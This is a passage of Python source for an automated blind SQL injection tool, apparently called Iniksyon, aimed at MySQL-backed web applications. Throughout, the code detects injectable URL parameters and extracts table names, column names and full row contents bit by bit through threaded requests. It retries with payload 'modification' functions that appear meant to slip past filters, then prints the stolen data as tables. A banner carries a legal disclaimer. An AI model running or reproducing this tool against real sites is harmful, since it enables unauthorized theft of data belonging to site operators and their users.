            temp += bin(1)[2:].zfill(zV)
        elif r.text == t2.text:
            temp += bin(2)[2:].zfill(zV)
        elif r.text == t3.text:
            temp += bin(3)[2:].zfill(zV)
        elif r.text == t4.text:
            temp += bin(4)[2:].zfill(zV)
        elif r.text == t5.text:
            temp += bin(5)[2:].zfill(zV)
        elif r.text == t6.text:
            temp += bin(6)[2:].zfill(zV)
        elif r.text == t7.text:
            temp += bin(7)[2:].zfill(zV)
        return temp

    with concurrent.futures.ThreadPoolExecutor() as executor:
        while True:
            futures = []
            for payload in [payload1, payload2, payload3]:
                futures.append(executor.submit(getCharacters, payload, t0, t1, t2, t3, t4, t5, t6, t7))
            results = [future.result() for future in futures]
            tBin = ''.join(results)
            if len(tBin) == 0 or '00000000' in tBin:
                break
            if len(x) >= max_length:
                break
            x += chr(int(tBin, 2))
            sys.stdout.write(Fore.GREEN + f"\r[*] Result: {x}" + Fore.RESET)
            pos += 1
    return x

def extractTables(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7):
    row = 0
    tblNames = []
    while True:
        tempTbl = extractBooleanInfo(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, row, extract='tbls')
        if tempTbl:
            print ()
            tblNames.append(tempTbl)
            row += 1
        else:
            break
    return tblNames

def extractColumns(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, tblNames):
    clmNames = {}
    for tblName in tblNames:
        row = 0
        clmNames[tblName] = []
        while True:
            tempClm = extractBooleanInfo(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, row, extract='clms', tblName=tblName)
            if tempClm:
                print ()
                clmNames[tblName].append(tempClm)
                row += 1
            else:
                break
    return clmNames
    
def extractInfo(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, tblNames, clmNames):
    info = {}
    for tblName in tblNames:
        row = 0
        info[tblName] = []
        while True:
            tempDict = {}
            for clmName in clmNames[tblName]:
                print ()
                tempInfo = extractBooleanInfo(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, row, extract='info', tblName=tblName, clmName=clmName)
                tempDict[clmName] = tempInfo
            if not any(tempDict.values()):
                break
            info[tblName].append(tempDict)
            row += 1
    return info              

def extractLightspeed(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, tbl=None, clm=None):
    info = {}
    tblNames = [tbl] if tbl is not None else extractTables(url, params, vulnPoint, payload1[0], payload2[0], payload3[0], t0, t1, t2, t3, t4, t5, t6, t7)
    clmNames = {tbl: clm} if clm is not None else extractColumns(url, params, vulnPoint, payload1[1], payload2[1], payload3[1], t0, t1, t2, t3, t4, t5, t6, t7, tblNames)
    info.update(extractInfo(url, params, vulnPoint, payload1[2], payload2[2], payload3[2], t0, t1, t2, t3, t4, t5, t6, t7, tblNames, clmNames))
    
    if tbl is None and clm is None and info:
        return True, info
    elif tblNames and clmNames and info and any(info.values()):
        return True, info
    else:
        return False, info

# Main
def displayBanner():
    # https://patorjk.com/software/taag/#p=testall&f=Doom&t=Iniksyon
    # https://naufalardhani.medium.com/how-to-create-ascii-text-banner-for-command-line-project-85e75dc02b07
    RED = "\33[91m"
    banner = f"""
    {RED}
 _____  _____ _     ______      _     _     _ _   
/  ___||  _  | |    | ___ \    | |   | |   (_) |  
\ `--. | | | | |    | |_/ /__ _| |__ | |__  _| |_ 
 `--. \| | | | |    |    // _` | '_ \| '_ \| | __|
/\__/ /\ \/' / |____| |\ \ (_| | |_) | |_) | | |_ 
\____/  \_/\_\_____/\_| \_\__,_|_.__/|_.__/|_|\__|
                                                   
    Created by Lucyn          
    """
    print (banner)
    print (Fore.WHITE + "[!] legal disclaimer: Usage of Iniksyon for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program." + Fore.RESET)
    print ()

displayBanner()

def displayInfo(info):
    for tbl, rows in info.items():
        print (Fore.WHITE + f"\n\nTABLE: {tbl}" + Fore.RESET)
        print ('-' * (20 * len((list(rows[0].keys()))) + 30))
        columns = list(rows[0].keys())
        header = " | ".join(["{:<20s}" for _ in columns])
        print (header.format(*columns))
        print ('-' * (20 * len((list(rows[0].keys()))) + 30))

        for row in rows:
            rowV = [row[col] for col in columns]
            rowF = " | ".join(["{:<20s}" for _ in columns])
            print (rowF.format(*rowV))
        print ('-' * (20 * len((list(rows[0].keys()))) + 30))

# Get the arguments
parser = argparse.ArgumentParser(description='Iniksyon menu')
parser.add_argument('--url', help='The base URL')
parser.add_argument('--table', help='Specify Table name')
parser.add_argument('--column', help='Specify Column name(s) separeted by commas')
parser.add_argument('--speed', help='The speedy extraction set True to use. (Needs to be specified with *)')
parser.add_argument('--brute', help='BruteForce Algorithm')
args = parser.parse_args()

if not args.url:
    print (Fore.RED + "Error: You must provide a valid URL" + Fore.RESET)  
else:
    url = args.url
    tbl = args.table
    clm = args.column.split(',') if args.column else None

    if '*' in url:
        baseURL, paramValues, specialParam = getSpecialURL(url)
        if args.speed:
            baseURL, paramValues, specialParam = getSpecialURL(url)
            t0 = paramValues.copy()
            t1 = paramValues.copy()
            t2 = paramValues.copy()
            t3 = paramValues.copy()
            t4 = paramValues.copy()
            t5 = paramValues.copy()
            t6 = paramValues.copy()
            t7 = paramValues.copy()
            t0[specialParam] = 0
            t1[specialParam] = 1
            t2[specialParam] = 2
            t3[specialParam] = 3
            t4[specialParam] = 4
            t5[specialParam] = 5
            t6[specialParam] = 6
            t7[specialParam] = 7
            start = time.time()
            rT0 = sendGetQ(url, params=t0, allow_redirects=False)
            rT1 = sendGetQ(url, params=t1, allow_redirects=False)
            rT2 = sendGetQ(url, params=t2, allow_redirects=False)
            rT3 = sendGetQ(url, params=t3, allow_redirects=False)
            rT4 = sendGetQ(url, params=t4, allow_redirects=False)
            rT5 = sendGetQ(url, params=t5, allow_redirects=False)
            rT6 = sendGetQ(url, params=t6, allow_redirects=False)
            rT7 = sendGetQ(url, params=t7, allow_redirects=False)
            r, info = extractLightspeed(baseURL, paramValues, specialParam, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, rT0, rT1, rT2, rT3, rT4, rT5, rT6, rT7, tbl=tbl, clm=clm)
            end = time.time()
            print (f"Time Speed: {end - start}")
            if r:
                displayInfo(info)
            else:
                success = False
                for func in modifyFunctions:
                    mFunc = globals()[func]
                    print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
                    start = time.time()
                    r2, info = extractLightspeed(baseURL, paramValues, specialParam, mFunc(optimisedSQAndingPayload1), mFunc(optimisedSQAndingPayload2), mFunc(optimisedSQAndingPayload3), rT0, rT1, rT2, rT3, rT4, rT5, rT6, rT7, tbl=tbl, clm=clm)
                    end = time.time()
                    if r2:
                        print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {specialParam} parameter" + Fore.RESET)
                        print (f"Time Speed: {end - start}")
                        displayInfo(info)
                        success = True
                        break
                if not success:
                    print (Fore.RED + "[-] Application is not vulnerable?" + Fore.RESET)
        if '*' in url and args.speed is None:
            print (Fore.RED + "[-] You cannot use '*' without speed option." + Fore.RESET)
    else:
        baseURL, paramValues = getURL(url)
        results,params,vulnPoint = identifyMySQLBoolean(baseURL, paramValues, fuzzGenericPayloads, trueFalsePayloads)
        if results:
            print (Fore.GREEN + f"[+] Potential Vulnerability Found in {vulnPoint} parameter" + Fore.RESET)
            print (Fore.YELLOW + f"[*] Dumping Database!" + Fore.RESET)
            r, info = extractBooleanMain(baseURL, params, vulnPoint, extractBP0, trueFalsePayloads, tbl=tbl, clm=clm)
            if r:
                displayInfo(info)
            else:
                success = False
                for func in modifyFunctions.modifyFunctions:
                    mFunc = globals()[func]
                    print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
                    r, info = extractBooleanMain(baseURL, params, vulnPoint, mFunc(extractBP0), mFunc(trueFalsePayloads), tbl=tbl, clm=clm)
                    if r:
                        print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {vulnPoint} parameter" + Fore.RESET)
                        displayInfo(info)
                        success = True
                        break
                    else:
                        print (Fore.RED + "[-] Count not dump database" + Fore.RESET)
                if not success:
                    print (Fore.RED + "[-] Count not dump database" + Fore.RESET)
        else:
            success = False
            for func in modifyFunctions.modifyFunctions:
                mFunc = globals()[func]
                results, params, vulnPoint = identifyMySQLBoolean(baseURL, paramValues, mFunc(fuzzGenericPayloads), trueFalsePayloads)
                print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
                if results:
                    print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {vulnPoint} parameter" + Fore.RESET)
                    print (Fore.YELLOW + f"[*] Dumping Database!" + Fore.RESET)
                    start2 = time.time()
                    r, info = extractBooleanMain(url, params, vulnPoint, mFunc(extractBP0), mFunc(trueFalsePayloads), tbl=tbl, clm=clm)
                    end2 = time.time()
                    print (f"Time BiSection: {end2 - start2}")
                    if r:
                        displayInfo(info)
                        success = True
                        break
                    else:
                        print (Fore.RED + "[-] Count not dump database" + Fore.RESET)
            if not success:
                print (Fore.RED + "[-] Cound not dump database" + Fore.RESET)